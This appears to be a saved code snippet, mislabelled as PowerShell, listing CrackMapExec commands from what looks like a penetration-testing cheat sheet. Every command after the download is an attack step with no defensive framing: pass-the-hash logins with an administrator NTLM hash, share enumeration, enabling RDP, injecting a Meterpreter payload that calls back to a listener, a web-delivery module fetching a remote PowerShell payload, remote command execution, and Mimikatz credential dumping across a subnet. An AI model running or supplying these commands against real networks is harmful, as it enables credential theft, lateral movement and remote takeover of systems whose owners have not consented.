---
id: c682ff8f-04fe-40a4-9517-17e131c7dc39
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:01.851003+00:00'
updated_at: '2023-04-10T20:25:48.421157+00:00'
---

# Code Snippet c682ff8f

**Language**: Powershell

```powershell
# use the latest release, CME is now a binary packaged will all its dependencies
root@payload$ wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip

# execute cme (smb, winrm, mssql, ...)
root@payload$ cme smb -L
root@payload$ cme smb -M name_module -o VAR=DATA
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --local-auth
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f --shares
root@payload$ cme smb 192.168.1.100 -u Administrator -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
root@payload$ cme smb 192.168.1.100 -u Administrator -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
root@payload$ cme smb 192.168.1.100 -u Administrator -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
root@payload$ cme smb 10.10.14.0/24 -u user -p 'Password' --local-auth -M mimikatz
root@payload$ cme mimikatz --server http --server-port 80
```
